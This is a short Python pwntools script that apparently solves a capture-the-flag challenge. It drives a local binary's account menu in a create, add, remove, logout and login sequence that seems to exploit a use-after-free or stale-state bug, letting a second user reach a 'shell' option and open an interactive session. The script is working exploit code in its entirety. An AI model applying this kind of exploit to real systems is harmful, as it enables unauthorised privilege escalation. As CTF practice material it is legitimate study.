#!/usr/bin/env python3

from pwn import *

io = process("./bin/challenge", level="debug")


def menu(io, choice):
    io.recvline_contains(b"Exit")
    io.recvuntil(b"Choice: ")
    io.sendline(f"{choice}".encode())


def create_account(io, username, password):
    menu(io, 2)
    io.recvuntil(b"Username: ")
    io.sendline(username)
    io.recvuntil(b"Password: ")
    io.sendline(password)


def add_item(io, choice):
    menu(io, 2)
    io.recvuntil(b"Item: ")
    io.sendline(f"{choice}".encode())


def remove_item(io, choice):
    menu(io, 3)
    io.recvuntil(b"Item: ")
    io.sendline(f"{choice}".encode())


def logout(io):
    menu(io, 5)


def login(io, username, password):
    menu(io, 3)
    io.recvuntil(b"Username: ")
    io.sendline(username)
    io.recvuntil(b"Password: ")
    io.sendline(password)


def shell(io):
    menu(io, 7)


create_account(io, b"A", b"A")
add_item(io, 0)
remove_item(io, 0)
logout(io)
create_account(io, b"B", b"B")
logout(io)
login(io, b"A", b"A")
add_item(io, 1)
logout(io)
login(io, b"B", b"B")
shell(io)

io.interactive()
